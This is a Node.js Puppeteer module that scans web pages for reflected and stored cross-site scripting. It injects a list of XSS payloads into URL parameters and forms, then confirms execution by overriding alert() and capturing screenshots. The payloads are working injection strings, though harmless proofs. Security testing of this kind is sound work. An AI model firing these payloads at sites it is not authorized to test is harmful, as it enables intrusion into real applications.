const puppeteer = require('puppeteer');

const MARKER = 'XSS';

const PAYLOADS = {
  reflected: [
    `<script>alert("${MARKER}")</script>`,
    `"><script>alert("${MARKER}")</script>`,
    `<img src=x onerror=alert("${MARKER}")>`,
    `' onfocus=alert("${MARKER}") autofocus>`,
    `<svg/onload=alert("${MARKER}")>`,
    `"><svg/onload=alert("${MARKER}")>`,
  ],
  stored: [
    
    `<script>
document.body.insertAdjacentHTML(
  'afterbegin',
  '<div id="xss-proof">${MARKER}</div>'
)
</script>`,
`<script>console.log("${MARKER}")</script>`,
  ],
};

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function generateMarker(point, payloadIndex) {
  return `XSS_${point.param}_${Date.now()}_${payloadIndex}`;
}

function parseCookieHeader(cookie = '') {
  return cookie
    .split(';')
    .map(s => s.trim())
    .filter(Boolean)
    .map(pair => {
      const idx = pair.indexOf('=');
      if (idx === -1) return null;
      return {
        name: pair.slice(0, idx).trim(),
        value: pair.slice(idx + 1).trim(),
      };
    })
    .filter(Boolean);
}

async function applyCookies(page, cookie, url) {
  const cookies = parseCookieHeader(cookie);
  if (!cookies.length) return;

  const origin = new URL(url).origin;
  await page.setCookie(
    ...cookies.map(c => ({
      name: c.name,
      value: c.value,
      url: origin,
      path: '/',
    }))
  );
}

function stripHash(url) {
  const u = new URL(url);
  u.hash = '';
  return u.href;
}

function buildUrlWithParam(baseUrl, param, payload) {
  const u = new URL(baseUrl);
  const fragment = u.hash;
  const hasHashQuery = fragment.includes('?');
  const fragmentPath = hasHashQuery ? fragment.slice(0, fragment.indexOf('?')) : fragment;
  const fragmentQuery = hasHashQuery ? fragment.slice(fragment.indexOf('?') + 1) : '';

  if (fragment) {
    const sp = new URLSearchParams(fragmentQuery);
    sp.set(param, payload);
    u.hash = fragmentPath + '?' + sp.toString();
  } else {
    u.searchParams.set(param, payload);
  }
  return u.href;
}

async function fillAndSubmitForm(page, data) {
  const navigationPromise = page.waitForNavigation({
    waitUntil: 'domcontentloaded',
    timeout: 5000,
  }).catch(() => null);

  await page.evaluate((formData) => {
    const form = document.querySelector('form');
    if (!form) return;

    for (const [name, value] of Object.entries(formData)) {
      const el = form.querySelector(`[name="${CSS.escape(name)}"]`);
      if (el) el.value = value;
    }

    const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
    if (submitBtn) {
      submitBtn.click();
    } else if (typeof form.requestSubmit === 'function') {
      form.requestSubmit();
    } else {
      form.submit();
    }
  }, data);

  await navigationPromise;
  return page.url();
}

async function detectDomMarker(page, marker) {
  try {
    return await page.evaluate((m) => {
      const text = document.body ? document.body.innerText || '' : '';
      const html = document.documentElement ? document.documentElement.innerHTML || '' : '';
      return text.includes(m) || html.includes(m);
    }, marker);
  } catch {
    return false;
  }
}

// ---------- NEW: override alert() to create a visual proof element ----------
async function injectAlertOverride(page) {
  await page.evaluateOnNewDocument(() => {
    window.alert = (msg) => {
      const proof = document.createElement('div');
      proof.id = 'xss-alert-proof';
      proof.style.cssText =
        'position:fixed;top:20px;left:50%;transform:translateX(-50%);' +
        'background:#d32f2f;color:white;padding:16px 32px;border-radius:8px;' +
        'font-size:18px;z-index:99999;box-shadow:0 4px 12px rgba(0,0,0,0.3);';
      proof.textContent = '🚨 XSS Alert: ' + msg;
      document.body.appendChild(proof);
    };
  });
}

async function testXSS(point, cookie = '', mode = 'reflected') {
  const findings = [];
  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  const payloads = PAYLOADS[mode] || PAYLOADS.reflected;

  try {
    for (let i = 0; i < payloads.length; i++) {
      const page = await browser.newPage();

      // Override alert BEFORE any content loads → the proof element appears instead of dialog
      await injectAlertOverride(page);

      let consoleDetected = false;
      let phase = mode === 'stored' ? 'inject' : 'reflect';

      const marker = generateMarker(point, i);
      const payload = payloads[i].replaceAll(MARKER, marker);
      const baseUrl = stripHash(point.url);

      // We no longer need a dialog handler, but we keep a console handler for stored logs
      const consoleHandler = (msg) => {
        if (phase === 'observe' && msg.text().includes(marker)) {
          consoleDetected = true;
        }
      };
      page.on('console', consoleHandler);

      try {
        await applyCookies(page, cookie, point.url);

        let finalUrl = baseUrl;

        if (point.type === 'query') {
          finalUrl = buildUrlWithParam(baseUrl, point.param, payload);
          await page.goto(finalUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });
        } else if (point.type === 'form') {
          await page.goto(baseUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });
          await wait(700);

          const formData = { ...(point.otherParams || {}) };
          formData[point.param] = payload;

          finalUrl = await fillAndSubmitForm(page, formData) || page.url();
        } else {
          await page.goto(baseUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });
        }

        if (mode === 'reflected') {
          phase = 'reflect';
          await wait(1500);

          // Check for the visual proof element instead of dialog
          const proofVisible = await page.$('#xss-alert-proof');

          if (proofVisible) {
            const screenshot = await page.screenshot({ encoding: 'base64' });

            findings.push({
              type: 'XSS',
              xssMode: 'reflected',
              url: baseUrl,
              method: point.method || 'GET',
              param: point.param,
              payload,
              marker,
              request: point.type === 'query'
                ? `GET ${finalUrl}`
                : `${point.method || 'GET'} ${baseUrl} (form param ${point.param})`,
              responseSnippet: `Alert with marker "${marker}" confirmed (visible proof captured)`,
              screenshot,
              confidence: 'high',
            });

            await page.close();
            break;
          }
        } else {
          // Stored mode
          const observeUrl = stripHash(point.observeUrl || baseUrl);

          phase = 'observe';
          await page.goto(observeUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });

          await wait(1000);
          await page.reload({
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });

          await wait(1500);

          const domDetected = await detectDomMarker(page, marker);
          const proofVisible = await page.$('#xss-alert-proof');

          if (proofVisible || domDetected || consoleDetected) {
            const screenshot = await page.screenshot({ encoding: 'base64' });

            findings.push({
              type: 'XSS',
              xssMode: 'stored',
              url: baseUrl,
              method: point.method || 'GET',
              param: point.param,
              payload,
              marker,
              request: point.type === 'query'
                ? `GET ${baseUrl}?${point.param}=${encodeURIComponent(payload)}`
                : `${point.method || 'GET'} ${baseUrl} (form param ${point.param})`,
              responseSnippet: proofVisible
                ? 'Alert banner with marker captured in screenshot'
                : consoleDetected
                  ? `Console log with marker "${marker}" detected on clean revisit`
                  : `Marker "${marker}" found in DOM after clean revisit`,
              screenshot,
              confidence: 'high',
            });

            await page.close();
            break;
          }
        }
      } catch (err) {
        console.error(`XSS test error (${mode}): ${err.message}`);
      } finally {
        page.off('console', consoleHandler);
        if (!page.isClosed()) await page.close();
      }
    }
  } finally {
    await browser.close();
  }

  return findings;
}

module.exports = { testXSS };